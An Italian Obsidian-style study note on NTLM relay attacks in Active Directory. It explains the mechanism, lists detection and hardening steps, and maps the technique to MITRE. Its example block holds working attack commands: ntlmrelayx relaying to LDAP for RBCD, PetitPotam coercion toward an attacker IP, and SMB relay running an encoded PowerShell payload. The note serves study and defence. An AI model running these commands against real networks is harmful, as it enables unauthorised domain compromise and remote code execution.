---
tipo: concetto
tag: [windows, ad]
fase: 3
fonti: 3
aggiornato: 2026-06-21
stato: maturo
aliases: ["NTLM Relay", "Relay NTLM"]
---

# NTLM Relay

> **Nota etica**: solo lab autorizzati o engagement con permesso scritto.

## In breve
L'**NTLM Relay** non *cracca* un hash: **inoltra** in tempo reale l'autenticazione [[NTLM]] di una vittima verso un *terzo* servizio, autenticandosi **come la vittima** senza conoscerne la password. Sfrutta il fatto che NTLM è un protocollo challenge-response **privo di binding** all'endpoint: la stessa risposta vale verso chiunque. È una delle catene più potenti in [[Active Directory]], spesso combinata con [[PrinterBug]] per *coercere* l'autenticazione di un account macchina.

## Come funziona (meccanismo)
1. L'attaccante si mette **in mezzo** (MITM o coercizione) e cattura un tentativo di auth NTLM.
2. Invece di tentare il crack offline ([[Pass-the-Hash]] usa l'hash; qui non serve), **rilancia** la challenge ricevuta dal *target* verso la vittima e la risposta della vittima verso il *target*.
3. Il target accetta: l'attaccante ha una sessione autenticata come la vittima.

**Precondizione chiave**: il target deve **non** richiedere il *signing*. SMB signing **non** forzato → relay SMB possibile. LDAP senza channel binding → relay LDAP (es. per scrivere `msDS-AllowedToActOnBehalfOfOtherIdentity` e fare **RBCD**).

## Esempio pratico
```bash
# 1. Avvia il relay verso LDAP del DC, con escalation RBCD
impacket-ntlmrelayx -t ldap://10.10.10.1 --delegate-access -smb2support

# 2. Coerci l'auth della macchina target (PrinterBug/PetitPotam) verso di te
python3 PetitPotam.py <attacker-ip> 10.10.10.20   # vedi [[PrinterBug]]

# Variante classica: relay SMB per esecuzione comandi
impacket-ntlmrelayx -t smb://10.10.10.30 -c 'powershell -enc ...' -smb2support
```
Spesso si usa [[Responder]] (LLMNR/NBT-NS poisoning) come fonte di autenticazioni, con SMB **disattivato** in Responder per non rubare l'auth che si vuole rilanciare.

## Casi limite
- **Relay verso lo stesso host** della vittima: mitigato da Microsoft (CVE-2019-1384 ecc.).
- **LDAP signing + channel binding** attivi → relay LDAP fallisce.
- Account **machine** relayati a LDAP → RBCD → compromissione dell'host.

## Detection e difesa
- **Forzare SMB signing** ovunque (GPO) e **LDAP signing + channel binding** sui DC.
- Disabilitare **LLMNR/NBT-NS** (toglie la fonte a [[Responder]]).
- Disabilitare NTLM dove possibile; **EPA** (Extended Protection for Authentication) sui servizi web.
- Detection: spike di auth NTLM da un host verso molti target; Event **4624/4625** logon type 3 con anomalie; coercizione (MS-RPRN/MS-EFSR) verso host insoliti.
- MITRE: **T1557.001** (Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay).

## Collegamenti
- [[NTLM]] — il protocollo abusato
- [[PrinterBug]] — coercizione che alimenta il relay
- [[Pass-the-Hash]] — alternativa quando hai già l'hash
- [[Active Directory]] · [[Impacket]] · [[SMB]] · [[Responder]]

## Fonti
- The Hacker Recipes — NTLM Relay: https://www.thehacker.recipes/ad/movement/ntlm/relay
- byt3bl33d3r — ntlmrelayx: https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py
- MITRE ATT&CK — T1557.001: https://attack.mitre.org/techniques/T1557/001/
